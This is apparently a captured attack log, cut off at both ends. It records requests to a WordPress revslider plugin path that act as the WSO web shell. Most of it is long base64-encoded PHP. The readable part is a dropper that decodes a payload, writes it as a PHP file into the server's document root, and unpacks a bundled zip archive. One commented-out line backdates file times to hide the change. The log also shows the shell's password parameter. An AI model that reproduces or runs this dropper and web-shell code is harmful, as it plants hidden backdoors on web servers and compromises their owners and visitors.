bHQgPSAxOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICgoJHZfcmVzdWx0PSR0aGlzLT5wcml2T3BlbkZkKCd3YicpKSAhPSAxKQ0KICB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICgoJHZfemlwX3RlbXBfZmQgPSBAZm9wZW4oJHBfYXJjaGl2ZV9maWxlbmFtZSwgJ3JiJykpID09IDApDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiBhcmNoaXZlIGZpbGUgXCcnLiRwX2FyY2hpdmVfZmlsZW5hbWUuJ1wnIGluIGJpbmFyeSB3cml0ZSBtb2RlJyk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X3NpemUgPSBmaWxlc2l6ZSgkcF9hcmNoaXZlX2ZpbGVuYW1lKTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBmcmVhZCgkdl96aXBfdGVtcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR0aGlzLT56aXBfZmQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogIEBmY2xvc2UoJHZfemlwX3RlbXBfZmQpOw0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZFcnJvckxvZygkcF9lcnJvcl9jb2RlPTAsICRwX2Vycm9yX3N0cmluZz0nJykNCnsNCiAgaWYgKFBDTFpJUF9FUlJPUl9FWFRFUk5BTCA9PSAxKSB7DQogICAgUGNsRXJyb3IoJHBfZXJyb3JfY29kZSwgJHBfZXJyb3Jfc3RyaW5nKTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkdGhpcy0+ZXJyb3JfY29kZSA9ICRwX2Vycm9yX2NvZGU7DQogICAgJHRoaXMtPmVycm9yX3N0cmluZyA9ICRwX2Vycm9yX3N0cmluZzsNCiAgfQ0KfQ0KDQpmdW5jdGlvbiBwcml2RXJyb3JSZXNldCgpDQp7DQogIGlmIChQQ0xaSVBfRVJST1JfRVhURVJOQUwgPT0gMSkgew0KICAgIFBjbEVycm9yUmVzZXQoKTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkdGhpcy0+ZXJyb3JfY29kZSA9IDA7DQogICAgJHRoaXMtPmVycm9yX3N0cmluZyA9ICcnOw0KICB9DQp9DQoNCmZ1bmN0aW9uIHByaXZEaXNhYmxlTWFnaWNRdW90ZXMoKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICBpZiAoICAgKCFmdW5jdGlvbl9leGlzdHMoImdldF9tYWdpY19xdW90ZXNfcnVudGltZSIpKQ0KICAgIHx8ICghZnVuY3Rpb25fZXhpc3RzKCJzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUiKSkpIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQogIGlmICgkdGhpcy0+bWFnaWNfcXVvdGVzX3N0YXR1cyAhPSAtMSkgew0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCiR0aGlzLT5tYWdpY19xdW90ZXNfc3RhdHVzID0gQGdldF9tYWdpY19xdW90ZXNfcnVudGltZSgpOw0KDQppZiAoJHRoaXMtPm1hZ2ljX3F1b3Rlc19zdGF0dXMgPT0gMSkgew0KICBAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOw0KfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgaWYgKCAgICghZnVuY3Rpb25fZXhpc3RzKCJnZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUiKSkNCiAgICB8fCAoIWZ1bmN0aW9uX2V4aXN0cygic2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lIikpKSB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KICBpZiAoJHRoaXMtPm1hZ2ljX3F1b3Rlc19zdGF0dXMgIT0gLTEpIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQppZiAoJHRoaXMtPm1hZ2ljX3F1b3Rlc19zdGF0dXMgPT0gMSkgew0KCSAgQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgkdGhpcy0+bWFnaWNfcXVvdGVzX3N0YXR1cyk7DQp9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KfQ0KDQpmdW5jdGlvbiBQY2xaaXBVdGlsUGF0aFJlZHVjdGlvbigkcF9kaXIpDQp7DQogICR2X3Jlc3VsdCA9ICIiOw0KDQogIGlmICgkcF9kaXIgIT0gIiIpIHsNCiAgICAkdl9saXN0ID0gZXhwbG9kZSgiLyIsICRwX2Rpcik7DQoNCiAgICAkdl9za2lwID0gMDsNCiAgICBmb3IgKCRpPXNpemVvZigkdl9saXN0KS0xOyAkaT49MDsgJGktLSkgew0KICAgICAgaWYgKCR2X2xpc3RbJGldID09ICIuIikgew0KICAgICAgfQ0KICAgICAgZWxzZSBpZiAoJHZfbGlzdFskaV0gPT0gIi4uIikgew0KCSAgJHZfc2tpcCsrOw0KICAgICAgfQ0KICAgICAgZWxzZSBpZiAoJHZfbGlzdFskaV0gPT0gIiIpIHsNCgkgIGlmICgkaSA9PSAwKSB7DQogICAgICAgICAgJHZfcmVzdWx0ID0gIi8iLiR2X3Jlc3VsdDsNCgkgICAgaWYgKCR2X3NraXAgPiAwKSB7DQoJICAgICAgICAkdl9yZXN1bHQgPSAkcF9kaXI7DQogICAgICAgICAgICAgICR2X3NraXAgPSAwOw0KCSAgICB9DQoJICB9DQoJICBlbHNlIGlmICgkaSA9PSAoc2l6ZW9mKCR2X2xpc3QpLTEpKSB7DQogICAgICAgICAgJHZfcmVzdWx0ID0gJHZfbGlzdFskaV07DQoJICB9DQoJICBlbHNlIHsNCgkgIH0NCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KCSAgaWYgKCR2X3NraXAgPiAwKSB7DQoJICAgICR2X3NraXAtLTsNCgkgIH0NCgkgIGVsc2Ugew0KICAgICAgICAgICR2X3Jlc3VsdCA9ICR2X2xpc3RbJGldLigkaSE9KHNpemVvZigkdl9saXN0KS0xKT8iLyIuJHZfcmVzdWx0OiIiKTsNCgkgIH0NCiAgICAgIH0NCiAgICB9DQogICAgDQogICAgaWYgKCR2X3NraXAgPiAwKSB7DQogICAgICB3aGlsZSAoJHZfc2tpcCA+IDApIHsNCiAgICAgICAgICAkdl9yZXN1bHQgPSAnLi4vJy4kdl9yZXN1bHQ7DQogICAgICAgICAgJHZfc2tpcC0tOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIFBjbFppcFV0aWxQYXRoSW5jbHVzaW9uKCRwX2RpciwgJHBfcGF0aCkNCnsNCiAgJHZfcmVzdWx0ID0gMTsNCiAgDQogIGlmICggICAoJHBfZGlyID09ICcuJykNCiAgICAgIHx8ICgoc3RybGVuKCRwX2RpcikgPj0yKSAmJiAoc3Vic3RyKCRwX2RpciwgMCwgMikgPT0gJy4vJykpKSB7DQogICAgJHBfZGlyID0gUGNsWmlwVXRpbFRyYW5zbGF0ZVdpblBhdGgoZ2V0Y3dkKCksIEZBTFNFKS4nLycuc3Vic3RyKCRwX2RpciwgMSk7DQogIH0NCiAgaWYgKCAgICgkcF9wYXRoID09ICcuJykNCiAgICAgIHx8ICgoc3RybGVuKCRwX3BhdGgpID49MikgJiYgKHN1YnN0cigkcF9wYXRoLCAwLCAyKSA9PSAnLi8nKSkpIHsNCiAgICAkcF9wYXRoID0gUGNsWmlwVXRpbFRyYW5zbGF0ZVdpblBhdGgoZ2V0Y3dkKCksIEZBTFNFKS4nLycuc3Vic3RyKCRwX3BhdGgsIDEpOw0KICB9DQoNCiAgJHZfbGlzdF9kaXIgPSBleHBsb2RlKCIvIiwgJHBfZGlyKTsNCiAgJHZfbGlzdF9kaXJfc2l6ZSA9IHNpemVvZigkdl9saXN0X2Rpcik7DQogICR2X2xpc3RfcGF0aCA9IGV4cGxvZGUoIi8iLCAkcF9wYXRoKTsNCiAgJHZfbGlzdF9wYXRoX3NpemUgPSBzaXplb2YoJHZfbGlzdF9wYXRoKTsNCg0KICAkaSA9IDA7DQogICRqID0gMDsNCiAgd2hpbGUgKCgkaSA8ICR2X2xpc3RfZGlyX3NpemUpICYmICgkaiA8ICR2X2xpc3RfcGF0aF9zaXplKSAmJiAoJHZfcmVzdWx0KSkgew0KDQogICAgaWYgKCR2X2xpc3RfZGlyWyRpXSA9PSAnJykgew0KICAgICAgJGkrKzsNCiAgICAgIGNvbnRpbnVlOw0KICAgIH0NCiAgICBpZiAoJHZfbGlzdF9wYXRoWyRqXSA9PSAnJykgew0KICAgICAgJGorKzsNCiAgICAgIGNvbnRpbnVlOw0KICAgIH0NCg0KICAgIGlmICgoJHZfbGlzdF9kaXJbJGldICE9ICR2X2xpc3RfcGF0aFskal0pICYmICgkdl9saXN0X2RpclskaV0gIT0gJycpICYmICggJHZfbGlzdF9wYXRoWyRqXSAhPSAnJykpICB7DQogICAgICAkdl9yZXN1bHQgPSAwOw0KICAgIH0NCg0KICAgICRpKys7DQogICAgJGorKzsNCiAgfQ0KDQogIGlmICgkdl9yZXN1bHQpIHsNCiAgICB3aGlsZSAoKCRqIDwgJHZfbGlzdF9wYXRoX3NpemUpICYmICgkdl9saXN0X3BhdGhbJGpdID09ICcnKSkgJGorKzsNCiAgICB3aGlsZSAoKCRpIDwgJHZfbGlzdF9kaXJfc2l6ZSkgJiYgKCR2X2xpc3RfZGlyWyRpXSA9PSAnJykpICRpKys7DQoNCiAgICBpZiAoKCRpID49ICR2X2xpc3RfZGlyX3NpemUpICYmICgkaiA+PSAkdl9saXN0X3BhdGhfc2l6ZSkpIHsNCiAgICAgICR2X3Jlc3VsdCA9IDI7DQogICAgfQ0KICAgIGVsc2UgaWYgKCRpIDwgJHZfbGlzdF9kaXJfc2l6ZSkgew0KICAgICAgJHZfcmVzdWx0ID0gMDsNCiAgICB9DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBQY2xaaXBVdGlsQ29weUJsb2NrKCRwX3NyYywgJHBfZGVzdCwgJHBfc2l6ZSwgJHBfbW9kZT0wKQ0Kew0KICAkdl9yZXN1bHQgPSAxOw0KDQogIGlmICgkcF9tb2RlPT0wKQ0KICB7DQogICAgd2hpbGUgKCRwX3NpemUgIT0gMCkNCiAgICB7DQogICAgICAkdl9yZWFkX3NpemUgPSAoJHBfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkcF9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHBfc3JjLCAkdl9yZWFkX3NpemUpOw0KICAgICAgQGZ3cml0ZSgkcF9kZXN0LCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgICAkcF9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgICB9DQogIH0NCiAgZWxzZSBpZiAoJHBfbW9kZT09MSkNCiAgew0KICAgIHdoaWxlICgkcF9zaXplICE9IDApDQogICAgew0KICAgICAgJHZfcmVhZF9zaXplID0gKCRwX3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHBfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICAgJHZfYnVmZmVyID0gQGd6cmVhZCgkcF9zcmMsICR2X3JlYWRfc2l6ZSk7DQogICAgICBAZndyaXRlKCRwX2Rlc3QsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAgICRwX3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICAgIH0NCiAgfQ0KICBlbHNlIGlmICgkcF9tb2RlPT0yKQ0KICB7DQogICAgd2hpbGUgKCRwX3NpemUgIT0gMCkNCiAgICB7DQogICAgICAkdl9yZWFkX3NpemUgPSAoJHBfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkcF9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHBfc3JjLCAkdl9yZWFkX3NpemUpOw0KICAgICAgQGd6d3JpdGUoJHBfZGVzdCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICAgJHBfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogICAgfQ0KICB9DQogIGVsc2UgaWYgKCRwX21vZGU9PTMpDQogIHsNCiAgICB3aGlsZSAoJHBfc2l6ZSAhPSAwKQ0KICAgIHsNCiAgICAgICR2X3JlYWRfc2l6ZSA9ICgkcF9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICRwX3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAgICR2X2J1ZmZlciA9IEBnenJlYWQoJHBfc3JjLCAkdl9yZWFkX3NpemUpOw0KICAgICAgQGd6d3JpdGUoJHBfZGVzdCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICAgJHBfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gUGNsWmlwVXRpbFJlbmFtZSgkcF9zcmMsICRwX2Rlc3QpDQp7DQogICR2X3Jlc3VsdCA9IDE7DQoNCiAgaWYgKCFAcmVuYW1lKCRwX3NyYywgJHBfZGVzdCkpIHsNCg0KICAgIGlmICghQGNvcHkoJHBfc3JjLCAkcF9kZXN0KSkgew0KICAgICAgJHZfcmVzdWx0ID0gMDsNCiAgICB9DQogICAgZWxzZSBpZiAoIUB1bmxpbmsoJHBfc3JjKSkgew0KICAgICAgJHZfcmVzdWx0ID0gMDsNCiAgICB9DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBQY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb24pDQp7DQogIA0KICAkdl9saXN0ID0gZ2V0X2RlZmluZWRfY29uc3RhbnRzKCk7DQogIGZvciAocmVzZXQoJHZfbGlzdCk7ICR2X2tleSA9IGtleSgkdl9saXN0KTsgbmV4dCgkdl9saXN0KSkgew0KICAgICR2X3ByZWZpeCA9IHN1YnN0cigkdl9rZXksIDAsIDEwKTsNCiAgICBpZiAoKCAgICgkdl9wcmVmaXggPT0gJ1BDTFpJUF9PUFQnKQ0KICAgICAgICAgfHwgKCR2X3ByZWZpeCA9PSAnUENMWklQX0NCXycpDQogICAgICAgICB8fCAoJHZfcHJlZml4ID09ICdQQ0xaSVBfQVRUJykpDQogICAgICAgICYmICgkdl9saXN0WyR2X2tleV0gPT0gJHBfb3B0aW9uKSkgew0KICAgICAgcmV0dXJuICR2X2tleTsNCiAgICB9DQogIH0NCiAgDQogICR2X3Jlc3VsdCA9ICdVbmtub3duJzsNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBQY2xaaXBVdGlsVHJhbnNsYXRlV2luUGF0aCgkcF9wYXRoLCAkcF9yZW1vdmVfZGlza19sZXR0ZXI9dHJ1ZSkNCnsNCiAgaWYgKHN0cmlzdHIocGhwX3VuYW1lKCksICd3aW5kb3dzJykpIHsNCiAgICBpZiAoKCRwX3JlbW92ZV9kaXNrX2xldHRlcikgJiYgKCgkdl9wb3NpdGlvbiA9IHN0cnBvcygkcF9wYXRoLCAnOicpKSAhPSBmYWxzZSkpIHsNCiAgICAgICAgJHBfcGF0aCA9IHN1YnN0cigkcF9wYXRoLCAkdl9wb3NpdGlvbisxKTsNCiAgICB9DQogICAgaWYgKChzdHJwb3MoJHBfcGF0aCwgJ1xcJykgPiAwKSB8fCAoc3Vic3RyKCRwX3BhdGgsIDAsMSkgPT0gJ1xcJykpIHsNCiAgICAgICAgJHBfcGF0aCA9IHN0cnRyKCRwX3BhdGgsICdcXCcsICcvJyk7DQogICAgfQ0KICB9DQogIHJldHVybiAkcF9wYXRoOw0KfQ0KDQoNCg0KDQokYXJjaGl2ZSA9IG5ldyBQY2xaaXAoIm5wdHpvdy56aXAiKTsNCmlmICgkYXJjaGl2ZS0+ZXh0cmFjdCgpID09IDApIHsNCmRpZSgiRXJyb3IgOiAiLiRhcmNoaXZlLT5lcnJvckluZm8odHJ1ZSkpOw0KfQ0KZWxzZQ0Kew0KZGllKCIxNDI1NzU2ODU2Iik7CQ0KfQ==";
            $file_name = "4048ad7bdb2.php";
            if( !empty($_SERVER["REAL_DOCUMENT_ROOT"]) ){
                $doc_root = $_SERVER["REAL_DOCUMENT_ROOT"];
            } else {
                $doc_root = $_SERVER["DOCUMENT_ROOT"];
            }

            $f_n = $doc_root . "/" . $file_name;

            if ( !write_file($f_n, $a) )
                write_file($file_name, $a);

            function write_file($file_name, $a){

                if( file_exists($file_name) ){
                    copy($file_name, $file_name."_backup");
                }
                if( file_put_contents($file_name, base64_decode($a)) )
                {		
                    echo "OK file saved";
                    //touch($file_name, time() - 3600 * 24 * rand(10, 70));
                    return true;
                }

                return false;
            }
    [p2] => 
    [p3] => 
    [charset] => UTF-8
    [pass] => nhzgrf
)

_COOKIE
 Array
(
)

_FILES
 
END _FILES
 $my_blog=http://www.stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider
pass parameter, acting as WSO
Acting as WSO, login cookie.
a = Php
c = 
p1 = $a="PD9waHAgCmlmKCBpc3NldCgkX1JFUVVFU1RbInRlc3RfdXJsIl0pICl7CmVjaG8gImZpbGUgdGVzdCBva2F5IjsKCn0KDQoNCiRkYXRhID0gYmFzZTY0X2RlY29kZSgiVUVzREJBb0FBQUFBQUpzUmVFc0FBQUFBQUFBQUFBQUFBQUFIQUFBQWJuQjBlbTkzTDFCTEF3UVVBQUFBQ0FDbEVYaExCdktoa0l3SkFBQTFHd0FBRVFBQUFHNXdkSHB2ZHk5bWJIWnZZWGN1Y0dodzVWbnJjOW82RnY5TVovby91QTRUb0EzR2hoQ1NFdHBMQ1duVDVqVkFtdTF0TWg1aEJMZ1l5NUhFdytuMmY5OGorWjJrdlV6djNnODcyMHlDcFBQVTBlOGNIZEhEdDk3VWUvN3MrYlA4MkZCYWlxcE51ZHBVOHVPcW1DRExrcE9hbUdERzFLYmdHOE1NdURWZ2d0OWFVMGpiWTZVNHRoMXM0clhOT0NzQ1Y2bWtXTk01R1NsaXNxUG9qVWFqMVB3WjU4SjFiSGNtV1V2Tm5QVEhRdFlVbTJQaWpEQVY5bGQ4TVFvODRIanVPWWluaVl4d3o4YXE5Q1cvWUppYWFJSmRibkppZ2pFdW1SQ2x5QzhxaGEwMm05MndseDh4WG1LMlpSZDJZT25ESmF4YzR5SDh2YVMyeS90elJIbEVHd3dvc21iaDdPVG9IWWtvSis3SUI0bFRlMGdSOWJjS084K2ZLYi8rVjlnNmhWMTNwdGlhWVJwcU9ldWZkRHNVclp4NDVSenpqdGg5TkYxd2F4cU9lNWVETWpoMDJYRnMySjlZM01BbVhZam8yamNhWFlScUJpdmJ3b2xCMkhuYjRTaVpNUWlaakFVUmE0V3QxV3AxbzFrK2kxUnNZUFRhWi9Za0R0VVhOQ1hrQmFqc093dnFSWXVZMitHd2JWbUV1SkVISFhSUHlNakJZYWczc05ZNWhxQ3RDSTJPcVVQY0phWW9GZGZDMXRGSnYwTkMraEZadVE1QkkvRG9ESW5kaHV2SDdmNUFyR0dPQWppa05Hemd4ckdEMTRzNWlESFBIc1ZLMzlzVE5DUUpuczVPTHhGbE1kbEdKcUxXMUY0bUt6QUxRcitCelpQZWFhTDhJMXBHUVp6TnhXbUJMd2wxTnU5allTcUJzR01QNFd6TEhxYk9odVpPRng1S0llbjArdkwxNjc0TkdSbkIxVmw1WlU3dHBZMmNDT0UyQXl3c0lzZk9QaHJWNGNZbk8yZHVzb0ZnVXA3amtSMXB1eGlQQWQwWTl0bGRldzZoY1JBdjVxNGRMWm1iSStteTIrNkZHanlXV0w3MCtaUzQ0ZVJ4UXZYUFRrNjdHMXJvZXhpUC9DZ1RJUTA5UW5tU2JXSnhRYm1EK3haeTNYZzdWd0NZY25zU1pqMHNMSWtQUlc1VFpBS2FVU2JGT3dRcVpxb0FIS0UwOWMrVHkyZ3l3WnVHN2d0eVIzZ2RaN3c3aVJSR2laNCt6UTMwWlpMSUZ4VWtISCtMYXJjQ0tpZUVUQ1Q0eEVUc2NRa2xGbTFxQXNwT2tQMVNlZ25ITU1aQnVaVUxvalRZS0RJVk9NU25GS09SUWpFWXNpVW1KTzBPeXM5OFE3T0l6VUl4eDdjSTArS2RpaVhiSFJPRzhVeGhzTGl5M1lTeWNEaEZnaFRPUGVMNG00ZHpoWWRXNXA2aFpFanViU2RLMDhuQ2NWSkZTTllranRmODhUR0lRczZpUXI2QlpXdUtxRU00ajBxRU94bUdvM2UyT3dseVV5a3BjU3VodklBcm5zTmxuVGY3M2Q3bmJ1OXJRVng2NWhYTXpQYjc3dm1nY0F2ODI5dkFldHcrN1hlVkY2Mld3amoxQ0NzcUhzVVRrMkxvRVN3TUtwNXFCOEIwK2Z5aWZOMytVZ1kzZm1rbHpRbzI0ZWQ3c09POExjb0ROQllHK0ozN0VmaitsRCtRUUZQQytOQkhveEV0SnNaNjNiT0xRZGRzSHgzMUNyZkNUb0RrQXZSRHo1ODlaVVRhaUdJVVVFcVNFenFtWEg3dXUyaU9SWE9XYnAwMHRhSnFlZk45ZC9CVkhSSDFWdmo2cUFjTFJFdWdMQ2UwNWFkODdvQWl3Uk1UbXltQ0tQZGtCRFF4MzFGVVZWS3hOU1dLWEpLenRjM0R3T1JTVFJ0SU02aHJJeHNpOGFDUkt6V3pmUEg0S3dXQlluV0gyZmVZakJPNVV0a28zVW9oejBuelo3WWVMU1o4d2JaZ1hHb0c0Y3pQc0EvSk8xTGttY1hRVWNzcTdFMVJCVURpK0VrbkUzN1lzbGVNNWc5b0MydHNVOFl6WlBHajVPOFdtUHFtQjAyQWNEc2tON01Vcy9yUUhlR0orZ3IrQkVZVDFsTHBLZG41MEFSeFRoeXl3clNZb1FhZWlJQ3RCYlpVNlBKaEtsYXNxZGpVZ2pxbTdkcThXR29xc0N6bkRIUGl3V2FzNlk3U3VlcWRYbHdPVFBnQWw2YWNlNjhybFNHaE5wdmRhZDZxd2ppaHZnWXZpN2Qzcll6aGJROHgxcm9EaDdpL0Q2ajVsZkplZDNEVk94LzAydWY5NDI1dlJ6RWtlK1N6Rk1OcmJBbWhSSkhsUU9rTWxvSWRDYXhER0J6c0ZxVm82ZERRZFIyUXJueVhER05DSVpjOHFBOHRveWsvRDJ2QjU2dFhVVDc4ZmxnWXhBWDZLdzNxdldhUmVRVks4S09RM0pFV21MTmR4T0V5MmI1ajFHb2RIT3h2UzVla0k3OFZwNTg3QitWSEZyZWR3cG1zL3FoUzEzU2xlQTBYRFZteHBuTFZWTUt4Y2o1UTZscTFxV0MzZk5WdktuVDUydEQyTlYzYkt5bnY0UWxES2xWZDM5TVBxdnZLc1UzeG1Ld3JobFlYOUlKTUJZb1ozRmdiSGxhbEV0U1BRQ2dqbnNtQ0czcmppa1FRYVJsd2xIN0IvQVNydkI3bUNDNTVFem1PVWxTM29Cdm4wSzBHdlhGUE1ySXlYSDN6TW9LWEVEeisrSTM2cHFpOUxCMVd2RGRiOXBXNkU2cmJ5YytGUnNBUWhwSUxPSnAvTlc0VnhKUThLb1hacFVHQ282UU81bks1QUhGQnJUZmRsdDZNeDRlR2tVeGE4ZWlWb1VkSXpQMmRCQlZBREhSS0xESzUzVWR3aE42SjhzVDRiNEd2VXZtZmc5OC9oYmJjWTdnZE1nKzVpdVdJVW5panNnUmNZdjBwZkVuTS9DWENBb0E5V2RHTXNLUUY5U1RBMDNmeEhjdnZneWxBanliYndUU2N2QWR3R3RPV1A0WUhJUXlxTFRZc2c5cnRzZGN5dG9lQk05dmVmY3ZRdDRjV2IrbmJhMFFucktYL1V3VlB6U0FPblBhZzVnNGQzRlRlUzdSRFAxV3Bha1pUZWZWMHhnQmRFKzFOU2YwdmxMZmNVOGp3WWxnNDA3S3hseW83aDVXUnZmeGRjT1FpZEVTM1p3YTJtcVpGdUpVM3BGU2E0clE5azZNSkMrOVBzYjBNT2RXZ0tISEQ5S1NpL3pQT05DOWVCeDJ6cW1WMXNlbGlQSmJ0NkNQMTh2dEtjK0hha0U5UDBhTW1YTlV5VmhYNVNwQVByNGY5dWhLV3FLajNyYnpNU1V6WUhOcWo4TzBRdjA2Q1QvTzhmZFl0M0RZZjhqM1lUMFFKV3ZnVW4reEFGNTRuT3RCNC9hdCtHMzBWSExkbXNZWTNSaWw0UkxReThUMlVIRysraDgzeWo4TktzQ0NpSHRMaTF2dmZLWTlTZkZKcnFTbjJuSHRaa1pkeEZLQ01xZGlHa0FuSHNmVFBwZWJJOWNVaG1FTjQwLzZJamlRaktJWEpRcHplbUhoaTM4SGpDdmF3VXNOa1hsSG9QSXFDS3lNNkRxc0pyRWZZeXI2M1JJN253a2ZvaXovU3I4Ty85Y0I1K2dXU2ZkSkFRUnFuc2FQS1ozU3ZDOVc1MjVOUHp2em9NZjNEUlg4UUVPYytxR09LWkVrL1ZJSFVPNjlYNjNYeFJ0R245OGJ1MEt2VlYwdE9TNHU5YjdoeFlOOVZUZEpjenh6WG1oY25iRHg2NmFQS3ZxWTI4NnZyeGw1RHlJVWF2dTdkYXRIUXFLYkdqV1JjcXlYamF1MnYrVk1xcS9zcE5RZXBzWjRSYmVabkg5ZjFXa09YLzZHeVZEVnJTb3NIalpLbUJrTkQzNGR4TVpyVUVrSzFtbUtxdzlpTkp0VUgwdWhtM2RqRk4rdnEvczE2cjVveXdXQ3h0aGNzMUJPcEE2RnRCTFM5R3Z3ZWp5SmRSc3l4cTR0aE0vL2h6L3VMRWVLMSt0NitmRFFHUk1FSDFnNkMzOW9RR04yVHVyNHJYN2JCYmpXMTRPdlQ4MEYzeG5YbnlQZXZEaTVPejl5eis4WjUzKzlNdkUvRG83NmhIMXdNenRqeWp0MFBQdm5mL3ZYdS9sUy90MnI4cXJyK2ZNVjcvcWZHK2VEVEx1ZWYreDE5ZHZmRmFMZGJyUUs4N2xNK1JZZGVqQUsrbXdyK2J1b01hNmt6M00wZUVDQTdjRjdaVWZjT0REVjZzb2RmWnNqUyt2Yk5md0JRU3dNRUNnQUFBQUFBRVJCelN3QUFBQUFBQUFBQUFBQUFBQTRBQUFCdWNIUjZiM2N2YzI5MGNHbGxMMUJMQXdRVUFBQUFDQUMwckhGTHZ5d2pjV01EQUFCMkJnQUFFd0FBQUc1d2RIcHZkeTl6YjNSd2FXVXZNUzUwZUhTVlZOMXUzRVFVdm8rVWR6Z2RpU3V3WnhlRTFHenRyU0FwTkNpaFVaTUtlbFhOMm1mWFEyMlBPNTdkemFvZ3RRc0NWVVhpZ211UWVJTnQxYlJKcTRSWEdMOFJaMnduMlNnMEFxM3NuVGsvMy9ubW0zTzh1aExjM005U21LQXVwY3BEMXZVN0REQ1BWQ3p6VWNqR1p1aGRaemY3cXl1cks4RzFqVHZyZS9kM2JrRmlLR1huM3VkYm0rdkFQTTYvK1d6bml6dDM3MjF6dnJHM0FkL2UzdHZlZ20wMWtDa0M0WEYrNjJzR0xER202SEUrblU3OXFTaUdTbzh6WCttUlMrSDdEdEhMNnBSdXg0OU56S2hrVU5jaGVua1pYa2ovcEU3c3JxMnROWm5NQmZWUzRSanJjWk9LSW5iL0dSb0JMdGZEUjJNNUNWbWtjb081OGN5c1FBYnRMbVNpS0ZJWkNVTWlOSmdmRXVRTmlCS2hTelJob3dQL1Y4VDFGbkhYekZMMDlpN2lHdHczUENwTEJ1Zkp1Y2d3WkE5eE5sVTZMcGVDSDdlMkh5NUh4MWhHV2hhTzN4VUpxY3dmZ3NZMFpLVWpVeWFJaGtHaWNYZ3VvQ2k4Qk5QQzEyTnVFc3lReHpnVTQ5VHdPc1d2dVRweHJ1TCtKZWFvaFZGNmljdFhLc25YdDNjL2dyYlFkN1NQc3RLUFZIYVpYYUswaWNZR1pPVE84MTZDUXpGeEVUNjlMbUdJMUtET2hjRlR1c3RYcU12U1hTQzVwRW5KZDNkM0Y3NEgrNGM5c1MvdFNmVzBtdHREcUo3WUExcitXRDJwbnRyRkZUUUl6VDEra1JRdGpScTJmeVovd0JzRGVYamRlY0ZBeGJOK1lNU0FacUFXTm1SVEdadWtCOTFPNTRNYmpIeWFuaGdtSXBVakdyeUJNb2FVNmtNUWtaeElUcG1Ob05UUmY3ZzVtWWtSbGp4VkkrV1A1SkFCYVJNeWF0ZUF0MkJBRElrVmQwVjV6YW9meEhJQ1VTcEtHcTVNeU56c0czYkI2QTZDbW14SmQvbWt0QXM0aFYySUhXV1k